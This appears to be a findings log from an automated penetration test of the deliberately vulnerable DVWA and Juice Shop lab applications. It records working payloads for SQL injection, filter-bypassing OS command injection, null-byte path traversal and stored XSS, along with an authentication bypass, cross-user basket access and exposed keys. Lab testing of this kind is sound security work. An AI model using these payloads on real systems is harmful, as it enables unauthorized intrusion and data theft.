state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

findings.title: Confidential acquisitions document via open /ftp/ directory listing
findings.response_evidence: /ftp/ listing browsable (200) exposing acquisitions.md. Direct GET returns confidential memo: '# Planned Acquisitions ... This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'

findings.title: Exposed encryption-keys directory (browsable listing)
request_sequence: GET /encryptionkeys/ -> 200 browsable listing with jwt.pub, premium.key
findings.response_evidence: Directory browsable (200): listing exposes 'jwt.pub 248' and 'premium.key 50'. Retrieved premium.key content: '1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42'.

findings.title: Unauthenticated user-feedback PII exposure
findings.response_evidence: Without authentication, endpoint returns feedback records disclosing author emails (partially masked but domain + fragments exposed, e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***ereum@juice-sh.op)') tied to UserId values. PII disclosure without auth.

findings.title: Login authentication-bypass SQL injection
findings.response_evidence: Response 200 returns authentication token for first user: {\"authentication\":{\"token\":\"[JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. Logged in as admin@juice-sh.op without valid credentials.

findings.title: Product-search SQL injection (UNION-based)
findings.response_evidence: Single quote triggers HTTP 500: 'Error: SQLITE_ERROR: near \"'%'\": syntax error'. 9-column UNION returns HTTP 200 with injected literal columns: {\"id\":1,\"name\":2,\"description\":3,\"price\":4,...\"deletedAt\":9} proving injection into SQL query.

findings.title: Poison null-byte path traversal bypassing /ftp/ extension filter
findings.response_evidence: Raw path returns HTTP 403: 'Error: Only .md and .pdf files are allowed!'. Appending URL-encoded null byte + .md (%2500.md) returns HTTP 200 with restricted backup file content: '{ \"name\": \"juice-shop\", \"version\": \"6.2.0-SNAPSHOT\", \"description\": \"An intentionally insecure JavaScript Web Application\"...}'.

findings.title: Cross-user basket access (BOLA) via /rest/basket/{id}
request_sequence: GET /rest/basket/6 as juiceshop_acct1 -> own basket (own_basket_id=6, UserId 22) contains Apple Juice qty 3
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7) -> 200 returns acct1's basket 6
findings.response_evidence: Authenticated as juiceshop_acct2 (own_basket_id=7), requesting /rest/basket/6 returns 200 with Account1's basket (id:6, UserId:22) disclosing distinct seeded item: 'Apple Juice (1000ml)' quantity 3. No ownership check enforced.

findings.title: SQL Injection (low) in sqli id parameter
findings.response_evidence: [security=low] TRUE boolean (1' OR '1'='1) returns multiple seeded surnames: admin, Brown, Me, Picasso, Smith. FALSE boolean (1' AND '1'='2) returns zero records (empty User ID output). Classic boolean SQLi.

findings.title: OS Command Injection (low) in exec ip parameter
findings.response_evidence: [security=low] Response appends command output after ping results: 'www-data' — confirms OS command injection executing whoami as the web process identity.

findings.title: Stored XSS (low) in guestbook message
findings.response_evidence: [security=low] Stored script in guestbook message field. On rendering page, browser_eval_js('window.xss_flag') returned 1, proving stored script executed in authenticated browser context. (Field maxlength=50; used 34-char canary <script>window.xss_flag=1</script>.)

findings.title: SQL Injection (medium) numeric boolean in sqli id parameter
findings.response_evidence: [security=medium] id is POST field with quotes escaped; numeric boolean used. TRUE (1 OR 1=1) returns seeded surnames: admin, Brown, Me, Picasso, Smith. FALSE (1 AND 1=2) returns zero records.

findings.title: OS Command Injection (medium) via pipe in exec ip
findings.response_evidence: [security=medium] ; and && are blacklisted; pipe bypass '127.0.0.1| whoami' returns output 'www-data' confirming command injection.

findings.title: OS Command Injection (high) via pipe-no-space in exec ip
findings.response_evidence: [security=high] '; ', '| ' (pipe+space), '&&' blacklisted; pipe-with-no-trailing-space '127.0.0.1|whoami' returns output 'www-data' confirming command injection.

findings.title: SQL Injection (high) via session-input with comment bypass of LIMIT 1
findings.response_evidence: [security=high] id submitted out-of-band via session-input.php; query appends LIMIT 1, bypassed with trailing comment (#). TRUE (1' OR '1'='1' #) returns all 5 seeded surnames: admin, Brown, Me, Picasso, Smith. FALSE (1' AND '1'='2' #) returns zero records.
